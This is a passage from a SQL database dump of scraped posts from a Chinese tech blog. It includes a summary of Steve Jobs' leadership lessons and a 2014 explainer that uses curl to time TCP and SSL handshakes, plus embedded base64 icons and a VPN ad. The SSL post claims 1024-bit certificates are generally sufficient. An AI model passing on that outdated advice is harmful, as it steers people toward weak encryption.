Z2SQkJBAWFobX6wVgoPooLWI0v4hxuFeFY30ahdoVhcqLkEJ9GCV1QRTehZNxZ9wPQNGXX5KZmUlbWxspKSkIIUhPT0dZFibQvSaHJjGKxujxBHZGoT+ehPpwEsoRIYUqmCR1YTTBd2NoGxtOz4Y3CPoDrNuwnuhpU7lq/HgW3LGU5l4P2h+g55XNnBOjORM/jsH3ozGLYlAFMag90ahPI6VQxZOlKo5BOyfjey+GliljaL0uA7l9D2f37uess5KBoyfwbvmIJnsajVePouXeCIKFsZglsajiyX8pvEYKoySm33DGYTjj0OVxhEri6N84kfalY2i/NRb3AhvNN0+i9Y4wPC+H4yuMxTocjzoYj7F/ymVxI/+ryH5huKaeMVzxGK54QuXT8B+y4atIZqB8Nt6SVDzFqXi+mIO39Dp+PziHwdIZDJVOJ3gogZArHsM1BcMVj1E+BcMVe1GY38auNqqnYdQkEKpOJPBNEv7DdnyVdnwVdoYqki+bge9wCv6qFAJVyQS/mU6oJhHjSCJG9VSM6kRUfXi2GK6fJYy6+CyjNrHRqLP1GbWJ0qizSfV39Tap6qdLVW+Xqt4ujfokadRdVpvgNWpt54y6qc8MV44Sfw4An+t+Gj1AKyYAAAAASUVORK5CYII=" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-15 09:54:55', '2014-10-02 04:13:53', 0, '[["\\u4e54\\u5e03\\u65af", 0.4979197595848806], ["\\u7535\\u8111", 0.09843724150888594], ["\\u4ea7\\u54c1", 0.09669720718578251], ["10", 0.09513077588514589], ["\\u9f20\\u6807", 0.08601831723023873], ["\\u7bf1\\u7b06", 0.07844265027167109], ["\\u684c\\u9762", 0.07421193639366049], ["\\u8bbe\\u8ba1", 0.07330403064668435], ["\\u673a\\u7bb1", 0.06638930127798408], ["\\u65bd\\u4e50\\u516c\\u53f8", 0.06520551585941645], ["\\u957f\\u6587", 0.0642382927464191], ["\\u5728\\u7ebf", 0.06368851817777188], ["Macintosh", 0.06342051725676393], ["\\u628a\\u624b", 0.06117828824578249], ["\\u82f9\\u679c\\u516c\\u53f8", 0.061022718192042434], ["\\u82f9\\u679c", 0.059953903482015916], ["\\u539f\\u8457", 0.053915161982493374], ["\\u4f46\\u662f", 0.04428253573559682], ["\\u7236\\u4eb2", 0.043997130774350135], ["\\u5199\\u4e0b", 0.04370141735724138]]', NULL, NULL, '2011年11月出版的《乔布斯传》很畅销，也写得很好，我还写过一篇读后感。 但是，很少有人知道，它的作者沃尔特·艾萨克森（Walter Isaacson）在6个月后的2012年4月，为《哈佛商业评论》写过一篇2万多字的长文，总结乔布斯的管理艺术，名字叫做《乔布斯的管理课：卓越领导力的14位密码》（The Real Leadership Lessons of Steve Jobs，英文版在线阅读，PDF下载，中文版在线阅读，亚马逊，豆瓣）。 这篇长文基本上是原著的浓缩，但是有一些新的细节。如果你没有时间读原著，可以只读它。下面，我摘录几个打动我的段落。 一、保持专注 1997年，乔布斯重新执掌濒临破产的苹果公司。那时，苹果公司有庞大的产品线，单单Macintosh电脑就有十几个版本。乔布斯决定砍掉大部分产品。 他在白板上画了一个2x2的网格。"这才是我们要的，"在两栏的底部，他写下"普通消费者"（Consumer）和"专业用户"（Pro），在两行的前端他写下"桌面设备"（Desktop）和"便携设备"（Portable）。他告诉团队，我们的工作就是要生产四个伟大的产品，表格的每一格代表一个产品，其余的产品应该全部取消。 还有一次，乔布斯问大家："我们下一步最应该做的10件事是什么？"，大家七嘴八舌，列出了10件事。乔布斯划掉了后面7件，说我们只做最前面的3件。 二、保持简单 乔布斯参观施乐公司的Palo Alto实验室，见到了刚刚发明的鼠标。他一下子被吸引住了。 回来以后，他告诉设计人员，立刻仿造一个。但是，施乐公司的鼠标有三个键，乔布斯要求苹果的鼠标只能有一个键。 设计iPod操作界面时，乔布斯坚持最多只需三次点击，用户就能完成所有操作。 乔布斯经常问别人，你觉得有没有什么东西过于复杂了？他以此作为参考，决定下一步要开发的产品。 三、追求完美 乔布斯从小养成追求完美的性格。有一次，他与父亲在后院搭篱笆。父亲要求篱笆的背面也要精心施工。乔布斯说："谁会去看篱笆的背面？"父亲回答："你会看到。" 开发Macintosh电脑时，他不顾整个团队的反对，要求机箱内部的电路板和电线也要整齐美观。设计定案后，他把设计人员的签名镌刻在机箱上，"真正的工匠都对自己的作品签名"。 四、重视设计 乔布斯重返苹果后的第一件产品，是彩色的桌面电脑iMac。它的顶部有一个把手，并不是那么有用，有谁会提着桌面电脑走来走去呢？ 生产部门希望去掉这个把手，这样可以降低成本。但是，乔布斯坚持要加上。因为，他觉得普通消费者仍然对电脑有敬畏感，认为那是高深莫测的产品。他希望，苹果的产品能够给人一种友好的、平易近人的、易于操作的感觉。这个把手可以传递这样的信号，仿佛在那里说，快来使用我吧。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年10月 2日 更多内容： 档案 » 创业 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(13, 'http://www.ruanyifeng.com/blog/2014/09/ssl-latency.html', 'SSL延迟有多大？', '<p>据说，Netscape公司当年设计<a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">SSL协议</a>的时候，有人提过，将互联网所有链接都变成HTTPs开头的加密链接。</p>\n\n        <p>这个建议没有得到采纳，原因之一是HTTPs链接比不加密的HTTP链接慢很多。（另一个原因好像是，HTTPs链接默认不能缓存。）</p>\n\n<p>自从我知道这个掌故以后，脑袋中就有一个观念：HTTPs链接很慢。但是，它到底有多慢，我并没有一个精确的概念。直到今天我从一篇<a href="http://www.semicomplete.com/blog/geekery/ssl-latency.html">文章</a>中，学到了测量HTTPs链接耗时的方法。</p>\n\n<p><img alt="slow connection" src="http://image.beekka.com/blog/2014/bg2014092401.jpg" title="" /></p>\n\n<p>首先我解释一下，为什么HTTPs链接比较慢。</p>\n\n<p>HTTPs链接和HTTP链接都建立在TCP协议之上。HTTP链接比较单纯，使用三个握手数据包建立连接之后，就可以发送内容数据了。</p>\n\n<p><img alt="tcp handshake" src="http://image.beekka.com/blog/2014/bg2014092402.png" title="" /></p>\n\n<p>上图中，客户端首先发送SYN数据包，然后服务器发送SYN+ACK数据包，最后客户端发送ACK数据包，接下来就可以发送内容了。这三个数据包的发送过程，叫做TCP握手。</p>\n\n<p>再来看HTTPs链接，它也采用TCP协议发送数据，所以它也需要上面的这三步握手过程。而且，在这三步结束以后，它还有一个<a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">SSL握手</a>。</p>\n\n<p>总结一下，就是下面这两个式子。</p>\n\n<blockquote>\n  <p>HTTP耗时 = TCP握手</p>\n\n<p>HTTPs耗时 = TCP握手 + SSL握手</p>\n</blockquote>\n\n<p>所以，HTTPs肯定比HTTP耗时，这就叫SSL延迟。</p>\n\n<p>命令行工具<a href="http://www.ruanyifeng.com/blog/2011/09/curl.html">curl</a>有一个w参数，可以用来测量TCP握手和SSL握手的具体耗时，以访问支付宝为例。</p>\n\n<blockquote><pre><code class="language-bash">\n\n$ curl -w "TCP handshake: %{time_connect}, SSL handshake: %{time_appconnect}\\n" -so /dev/null https://www.alipay.com\n\nTCP handshake: 0.022, SSL handshake: 0.064\n\n</code></pre></blockquote>\n\n<p>上面命令中的w参数表示指定输出格式，time_connect变量表示TCP握手的耗时，time_appconnect变量表示SSL握手的耗时（更多变量请查看<a href="http://curl.haxx.se/docs/manpage.html">文档</a>和<a href="https://josephscott.org/archives/2011/10/timing-details-with-curl/">实例</a>），s参数和o参数用来关闭标准输出。</p>\n\n<p>从运行结果可以看到，SSL握手的耗时（64毫秒）大概是TCP握手（22毫秒）的三倍。也就是说，在建立连接的阶段，HTTPs链接比HTTP链接要长3倍的时间，具体数字取决于CPU的快慢和网络状况。</p>\n\n<p>所以，如果是对安全性要求不高的场合，为了提高网页性能，建议不要采用保密强度很高的数字证书。一般场合下，1024位的证书已经足够了，2048位和4096位的证书将进一步延长SSL握手的耗时。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-09-24T21:59:19+08:00">2014年9月24日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/developer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 开发者手册</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAKOWlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanZZ3VFTXFofPvXd6oc0wAlKG3rvAANJ7k15FYZgZYCgDDjM0sSGiAhFFRJoiSFDEgNFQJFZEsRAUVLAHJAgoMRhFVCxvRtaLrqy89/Ly++Osb+2z97n77L3PWhcAkqcvl5cGSwGQyhPwgzyc6RGRUXTsAIABHmCAKQBMVka6X7B7CBDJy82FniFyAl8EAfB6WLwCcNPQM4BOB/+fpFnpfIHomAARm7M5GSwRF4g4JUuQLrbPipgalyxmGCVmvihBEcuJOWGRDT77LLKjmNmpPLaIxTmns1PZYu4V8bZMIUfEiK+ICzO5nCwR3xKxRoowlSviN+LYVA4zAwAUSWwXcFiJIjYRMYkfEuQi4uUA4EgJX3HcVyzgZAvEl3JJS8/hcxMSBXQdli7d1NqaQffkZKVwBALDACYrmcln013SUtOZvBwAFu/8WTLi2tJFRbY0tba0NDQzMv2qUP91829K3NtFehn4uWcQrf+L7a/80hoAYMyJarPziy2uCoDOLQDI3fti0zgAgKSobx3Xv7oPTTwviQJBuo2xcVZWlhGXwzISF/QP/U+Hv6GvvmckPu6P8tBdOfFMYYqALq4bKy0lTcinZ6QzWRy64Z+H+B8H/nUeBkGceA6fwxNFhImmjMtLELWbx+YKuGk8Opf3n5r4D8P+pMW5FonS+BFQY4yA1HUqQH7tBygKESDR+8Vd/6NvvvgwIH554SqTi3P/7zf9Z8Gl4iWDm/A5ziUohM4S8jMX98TPEqABAUgCKpAHykAd6ABDYAasgC1wBG7AG/iDEBAJVgMWSASpgA+yQB7YBApBMdgJ9oBqUAcaQTNoBcdBJzgFzoNL4Bq4AW6D+2AUTIBnYBa8BgsQBGEhMkSB5CEVSBPSh8wgBmQPuUG+UBAUCcVCCRAPEkJ50GaoGCqDqqF6qBn6HjoJnYeuQIPQXWgMmoZ+h97BCEyCqbASrAUbwwzYCfaBQ+BVcAK8Bs6FC+AdcCXcAB+FO+Dz8DX4NjwKP4PnEIAQERqiihgiDMQF8UeikHiEj6xHipAKpAFpRbqRPuQmMorMIG9RGBQFRUcZomxRnqhQFAu1BrUeVYKqRh1GdaB6UTdRY6hZ1Ec0Ga2I1kfboL3QEegEdBa6EF2BbkK3oy+ib6Mn0K8xGAwNo42xwnhiIjFJmLWYEsw+TBvmHGYQM46Zw2Kx8lh9rB3WH8vECrCF2CrsUexZ7BB2AvsGR8Sp4Mxw7rgoHA+Xj6vAHcGdwQ3hJnELeCm8Jt4G749n43PwpfhGfDf+On4Cv0CQJmgT7AghhCTCJkIloZVwkfCA8JJIJKoRrYmBRC5xI7GSeIx4mThGfEuSIemRXEjRJCFpB+kQ6RzpLuklmUzWIjuSo8gC8g5yM/kC+RH5jQRFwkjCS4ItsUGiRqJDYkjiuSReUlPSSXK1ZK5kheQJyeuSM1J4KS0pFymm1HqpGqmTUiNSc9IUaVNpf+lU6RLpI9JXpKdksDJaMm4ybJkCmYMyF2TGKQhFneJCYVE2UxopFykTVAxVm+pFTaIWU7+jDlBnZWVkl8mGyWbL1sielh2lITQtmhcthVZKO04bpr1borTEaQlnyfYlrUuGlszLLZVzlOPIFcm1yd2WeydPl3eTT5bfJd8p/1ABpaCnEKiQpbBf4aLCzFLqUtulrKVFS48vvacIK+opBimuVTyo2K84p6Ss5KGUrlSldEFpRpmm7KicpFyufEZ5WoWiYq/CVSlXOavylC5Ld6Kn0CvpvfRZVUVVT1Whar3qgOqCmrZaqFq+WpvaQ3WCOkM9Xr1cvUd9VkNFw08jT6NF454mXpOhmai5V7NPc15LWytca6tWp9aUtpy2l3audov2Ax2yjoPOGp0GnVu6GF2GbrLuPt0berCehV6iXo3edX1Y31Kfq79Pf9AAbWBtwDNoMBgxJBk6GWYathiOGdGMfI3yjTqNnhtrGEcZ7zLuM/5oYmGSYtJoct9UxtTbNN+02/R3Mz0zllmN2S1zsrm7+QbzLvMXy/SXcZbtX3bHgmLhZ7HVosfig6WVJd+y1XLaSsMq1qrWaoRBZQQwShiXrdHWztYbrE9Zv7WxtBHYHLf5zdbQNtn2iO3Ucu3lnOWNy8ft1OyYdvV2o/Z0+1j7A/ajDqoOTIcGh8eO6o5sxybHSSddpySno07PnU2c+c7tzvMuNi7rXM65Iq4erkWuA24ybqFu1W6P3NXcE9xb3Gc9LDzWepzzRHv6eO7yHPFS8mJ5NXvNelt5r/Pu9SH5BPtU+zz21fPl+3b7wX7efrv9HqzQXMFb0ekP/L38d/s/DNAOWBPwYyAmMCCwJvBJkGlQXlBfMCU4JvhI8OsQ55DSkPuhOqHC0J4wybDosOaw+XDX8LLw0QjjiHUR1yIVIrmRXVHYqLCopqi5lW4r96yciLaILoweXqW9KnvVldUKq1NWn46RjGHGnIhFx4bHHol9z/RnNjDn4rziauNmWS6svaxnbEd2OXuaY8cp40zG28WXxU8l2CXsTphOdEisSJzhunCruS+SPJPqkuaT/ZMPJX9KCU9pS8Wlxqae5Mnwknm9acpp2WmD6frphemja2zW7Fkzy/fhN2VAGasyugRU0c9Uv1BHuEU4lmmfWZP5Jiss60S2dDYvuz9HL2d7zmSue+63a1FrWWt78lTzNuWNrXNaV78eWh+3vmeD+oaCDRMbPTYe3kTYlLzpp3yT/LL8V5vDN3cXKBVsLBjf4rGlpVCikF84stV2a9021DbutoHt5turtn8sYhddLTYprih+X8IqufqN6TeV33zaEb9joNSydP9OzE7ezuFdDrsOl0mX5ZaN7/bb3VFOLy8qf7UnZs+VimUVdXsJe4V7Ryt9K7uqNKp2Vr2vTqy+XeNc01arWLu9dn4fe9/Qfsf9rXVKdcV17w5wD9yp96jvaNBqqDiIOZh58EljWGPft4xvm5sUmoqbPhziHRo9HHS4t9mqufmI4pHSFrhF2DJ9NProje9cv+tqNWytb6O1FR8Dx4THnn4f+/3wcZ/jPScYJ1p/0Pyhtp3SXtQBdeR0zHYmdo52RXYNnvQ+2dNt293+o9GPh06pnqo5LXu69AzhTMGZT2dzz86dSz83cz7h/HhPTM/9CxEXbvUG9g5c9Ll4+ZL7pQt9Tn1nL9tdPnXF5srJq4yrndcsr3X0W/S3/2TxU/uA5UDHdavrXTesb3QPLh88M+QwdP6m681Lt7xuXbu94vbgcOjwnZHokdE77DtTd1PuvriXeW/h/sYH6AdFD6UeVjxSfNTws+7PbaOWo6fHXMf6Hwc/vj/OGn/2S8Yv7ycKnpCfVEyqTDZPmU2dmnafvvF05dOJZ+nPFmYKf5X+tfa5zvMffnP8rX82YnbiBf/Fp99LXsq/PPRq2aueuYC5R69TXy/MF72Rf3P4LeNt37vwd5MLWe+x7ys/6H7o/ujz8cGn1E+f/gUDmPP8kcBa2wAAADxQTFRFAAAAAAAAAgICBAQEBQUFBgYGBwcHCAgICQkJCgoKDQ0NExMTOTk5c3NzdXV1eHh4eXl5enp6e3t7fHx8rr9WJAAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYMADMaKH8BrQAAAGVJREFUGNONkI0KwCAIhE+32n/b2vu/6yqYCRnshMCPS/SA/6Ikk5vQWXQ7gpL6H1KV54OMbCiuCk0n9rOdma3i1JteuIGIJ1bI60Se2dG4qFWDddQsSeiZpRkILfQ6Hcmvk2NPLzksA4TnEeNNAAAAAElFTkSuQmCC" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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